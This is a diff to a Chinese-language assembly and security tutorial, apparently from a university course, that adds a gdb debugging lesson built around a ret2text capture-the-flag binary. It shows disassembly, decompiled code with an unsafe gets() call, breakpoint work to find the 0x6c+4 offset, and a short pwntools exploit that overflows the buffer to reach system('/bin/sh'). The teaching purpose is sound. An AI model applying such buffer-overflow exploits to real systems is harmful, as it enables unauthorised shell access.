@@ -590,6 +590,12 @@ buffer.c:(.text+0x97): 警告：the `gets' function is dangerous and should not 
 - `-fno-stack-protector`:字面意思,关闭栈保护,不生成canary
 - `-no-pie`:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址.
 
+&emsp;&emsp;你可以使用如下命令来运行它:
+
+```sh
+> ./a
+```
+
 &emsp;&emsp;编译成功后我们可以使用checksec工具检查编译生成的文件:
 
 ```sh
@@ -829,7 +835,230 @@ sh.sendline(payload)  # 将字符串发送给程序
 sh.interactive() # 将代码变为手动交互
 ```
 
-如果你对pwn也感兴趣的话可以去[校内ctf练习平台](http://ustb.ever404.com/challenges)上玩一玩(题目很久没更新了...最近更新一下qaq)
+
+
+最后来介绍一下动态调试技巧,主要是关于gdb的使用.我相信8成的人写代码仍然使用十分复古的调试方法:
+
+- 放置调试法:什么也不做等着bug消失
+- 再来一次调试法: 一定是编译器坏了,重新编译一次等bug消失
+- 玄学调试法: 随便改两个地方,用命运的力量消除bug
+- 放弃调试法: 洗洗睡了
+
+以上调试方法比较传统,而且操作难度教较大,下面我们来介绍一下很简单的gdb调试法.
+
+&emsp;&emsp;gdb(GNU Debugger)是所有调试器的爸爸,他的功能十分强大,可以跟踪堆栈,查看内存,打印寄存器,下断点等等,我们只讲以下基本技巧:
+
+1. 下断点
+2. 查看内存
+3. 打印寄存器
+4. 查看反汇编执行
+
+&emsp;&emsp;我们仍然用个栗子讲解,首先下载并打开[附件](https://github.com/Explainaur/USTB_Assembly_Documention/raw/master/src/example_2/ret2text)ret2text,然后你可以输入`ls`命令查看一下这个文件是不是绿色的,如果不是则说明没有可执行权限,你需要输入以下命令对其进行原谅:
+
+```sh
+chmod +x ret2txt
+```
+
+&emsp;&emsp;这个时候他应该已经被原谅了,我们查看一下他的保护措施:
+
+```sh
+root@Aurora:~/文档/doc/src/example_2(master⚡) # checksec ret2text 
+[*] '/root/\xe6\x96\x87\xe6\xa1\xa3/doc/src/example_2/ret2text'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+&emsp;&emsp;可以看到这是一个32位程序,只开启了NX保护(Not Executable 栈不可执行),下面进行逆向分析.
+
+```assembly
+08048648 <main>:
+ 8048648:       55                      push   %ebp
+ 8048649:       89 e5                   mov    %esp,%ebp
+ 804864b:       83 e4 f0                and    $0xfffffff0,%esp
+ 804864e:       83 c4 80                add    $0xffffff80,%esp
+ 8048651:       a1 60 a0 04 08          mov    0x804a060,%eax
+ 8048656:       c7 44 24 0c 00 00 00    movl   $0x0,0xc(%esp)
+ 804865d:       00 
+ 804865e:       c7 44 24 08 02 00 00    movl   $0x2,0x8(%esp)
+ 8048665:       00 
+ 8048666:       c7 44 24 04 00 00 00    movl   $0x0,0x4(%esp)
+ 804866d:       00 
+ 804866e:       89 04 24                mov    %eax,(%esp)
+ 8048671:       e8 5a fe ff ff          call   80484d0 <setvbuf@plt>
+ 8048676:       a1 40 a0 04 08          mov    0x804a040,%eax
+ 804867b:       c7 44 24 0c 00 00 00    movl   $0x0,0xc(%esp)
+ 8048682:       00 
+ 8048683:       c7 44 24 08 01 00 00    movl   $0x1,0x8(%esp)
+ 804868a:       00 
+ 804868b:       c7 44 24 04 00 00 00    movl   $0x0,0x4(%esp)
+ 8048692:       00 
+ 8048693:       89 04 24                mov    %eax,(%esp)
+ 8048696:       e8 35 fe ff ff          call   80484d0 <setvbuf@plt>
+ 804869b:       c7 04 24 6c 87 04 08    movl   $0x804876c,(%esp)
+ 80486a2:       e8 d9 fd ff ff          call   8048480 <puts@plt>
+ 80486a7:       8d 44 24 1c             lea    0x1c(%esp),%eax
+ 80486ab:       89 04 24                mov    %eax,(%esp)
+ 80486ae:       e8 ad fd ff ff          call   8048460 <gets@plt>
+ 80486b3:       c7 04 24 a4 87 04 08    movl   $0x80487a4,(%esp)
+ 80486ba:       e8 91 fd ff ff          call   8048450 <printf@plt>
+ 80486bf:       b8 00 00 00 00          mov    $0x0,%eax
+ 80486c4:       c9                      leave  
+ 80486c5:       c3                      ret    
+```
+
+&emsp;&emsp;还原一下大概就是:
+
+```c
+int main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("There is something amazing here, do you know anything?");
+  gets((char *)&v4);
+  printf("Maybe I will tell you next time !");
+  return 0;
+}
+
+```
+
+&emsp;&emsp;可以看到十分明显的gets()函数,然后我们又发现secure()函数存在`system("/bin/sh")`:
+
+```assembly
+ 804863a:       c7 04 24 63 87 04 08    movl   $0x8048763,(%esp)   ;这里传递参数 "/bin/sh" 复习一下传参方式哦
+ 8048641:       e8 4a fe ff ff          call   8048490 <system@plt>
+ 8048646:       c9                      leave  
+ 8048647:       c3                      ret    
+```
+
+&emsp;&emsp;假如我们可以返回到0x804863a似乎就可以直接getshell了,下面我们就分析如何构造payload,首先要确定padding的长度.
+
+> padding就是我们所能控制的内存到返回值的距离内所填充的垃圾数据,就是上个例子里一堆aaaaaaaa
+
+&emsp;&emsp;通过分析汇编代码我们发现事情并不简单:
+
+```assembly
+ 80486a7:       8d 44 24 1c             lea    0x1c(%esp),%eax
+ 80486ab:       89 04 24                mov    %eax,(%esp)
+ 80486ae:       e8 ad fd ff ff          call   8048460 <gets@plt>
+```
+
+&emsp;&emsp;不知是用了什么妖术,这个变量居然是根据esp来进行寻址的...众所周知esp是随时变化的,因此我们就需要动态调试,算一下变量距离ebp的偏移.输入一下命令启动gdb:
+
+```sh
+> gdb ret2text
+# 进来之后输入start启动程序
+gdb> start
+```
+
+![gdb1](./pic/gdb1.png)
+
+&emsp;&emsp;你会看到你的gdb跟我的一比简直low爆了...这是因为我装了插件,诸位暂时还是不要安装插件,因为你对gdb还不够熟悉,如果十分想要模仿我的话可以安装peda或者pwndbg.
+
+```sh
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+```
+
+&emsp;&emsp;接下来输入`disas`可以看到即将会执行的汇编指令:
+
+```assembly
+gef➤  disas
+Dump of assembler code for function main:
+   0x08048648 <+0>:     push   ebp
+   0x08048649 <+1>:     mov    ebp,esp
+   0x0804864b <+3>:     and    esp,0xfffffff0
+   0x0804864e <+6>:     add    esp,0xffffff80
+=> 0x08048651 <+9>:     mov    eax,ds:0x804a060
+   0x08048656 <+14>:    mov    DWORD PTR [esp+0xc],0x0
+   0x0804865e <+22>:    mov    DWORD PTR [esp+0x8],0x2
+   0x08048666 <+30>:    mov    DWORD PTR [esp+0x4],0x0
+   0x0804866e <+38>:    mov    DWORD PTR [esp],eax
+   0x08048671 <+41>:    call   0x80484d0 <setvbuf@plt>
+   0x08048676 <+46>:    mov    eax,ds:0x804a040
+   0x0804867b <+51>:    mov    DWORD PTR [esp+0xc],0x0
+   0x08048683 <+59>:    mov    DWORD PTR [esp+0x8],0x1
+   0x0804868b <+67>:    mov    DWORD PTR [esp+0x4],0x0
+   0x08048693 <+75>:    mov    DWORD PTR [esp],eax
+   0x08048696 <+78>:    call   0x80484d0 <setvbuf@plt>
+   0x0804869b <+83>:    mov    DWORD PTR [esp],0x804876c
+   0x080486a2 <+90>:    call   0x8048480 <puts@plt>
+   0x080486a7 <+95>:    lea    eax,[esp+0x1c]
+   0x080486ab <+99>:    mov    DWORD PTR [esp],eax
+   0x080486ae <+102>:   call   0x8048460 <gets@plt>
+   0x080486b3 <+107>:   mov    DWORD PTR [esp],0x80487a4
+   0x080486ba <+114>:   call   0x8048450 <printf@plt>
+   0x080486bf <+119>:   mov    eax,0x0
+   0x080486c4 <+124>:   leave  
+   0x080486c5 <+125>:   ret    
+```
+
+&emsp;&emsp;然后输入`register`指令可以查看寄存器信息:
+
+```sh
+gef➤  register
+$eax   : 0xf7f90dc8  →  0xffffd0cc  →  0xffffd2cc  →  "CLUTTER_IM_MODULE=fcitx"
+$ebx   : 0x0       
+$ecx   : 0xcab951ef
+$edx   : 0xffffd054  →  0x00000000
+$esp   : 0xffffcfa0  →  0x00000000
+$ebp   : 0xffffd028  →  0x00000000
+$esi   : 0xf7f8f000  →  0x001d9d6c
+$edi   : 0xf7f8f000  →  0x001d9d6c
+$eip   : 0x08048651  →  <main+9> mov eax, ds:0x804a060
+$eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+gef➤  
+```
+
+&emsp;&emsp;接着输入n或者s可以单步进行调试,他们的区别是:
+
+- n: 假如有函数调用的话,会直接执行完毕该函数,然后继续单步执行
+- s: 假如有函数调用的话,会进入函数然后继续单步执行
+
+&emsp;&emsp;好的,我们可以一路按n跑到关键位置,也可以在关键位置下断点然后让程序停在那里:
+
+```sh
+gef➤  b *0x080486AE
+Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
+gef➤  r
+There is something amazing here, do you know anything?
+
+Breakpoint 1, 0x080486ae in main () at ret2text.c:24
+24      gets(buf);
+────────────────────────[ registers ]────
+$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
+$ebx   : 0x00000000
+$ecx   : 0xffffffff
+$edx   : 0xf7faf870  →  0x00000000
+$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
+$ebp   : 0xffffcdc8  →  0x00000000
+$esi   : 0xf7fae000  →  0x001b1db0
+$edi   : 0xf7fae000  →  0x001b1db0
+$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
+```
+
+&emsp;&emsp;这里我们看到esp是 0xffffcd40,ebp 为具体的 payload 如下 0xffffcdc8，同时 s 相对于 esp 的索引为 `[esp+0x1c]`，所以，s 的地址为 0xffffcd5c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。
+
+exp如下:
+
+```python
+#!/usr/bin/python2
+from pwn import *
+
+sh = process('./ret2text')
+target = 0x804863a
+sh.sendline('A' * (0x6c+4) + p32(target))
+sh.interactive()
+```
+
+&emsp;&emsp;现在你已经稍微入点高级编程门了.
+
+&emsp;&emsp;如果你对pwn也感兴趣的话可以去[校内ctf练习平台](http://ustb.ever404.com/challenges)上玩一玩(题目很久没更新了...最近更新一下qaq)
 
 ---
 
@@ -849,7 +1078,7 @@ sh.interactive() # 将代码变为手动交互
 
 &emsp;&emsp;
 
-
+&emsp;&emsp;如果你对本文档持任何异议,请纠缠我的基友原计1805戏曲爱好者孙某.
 
 > PS: 如果你也是爱猫人士或者对计算机安全感兴趣,欢迎与各位大佬交流 (CTF缺队友...qaq
 >
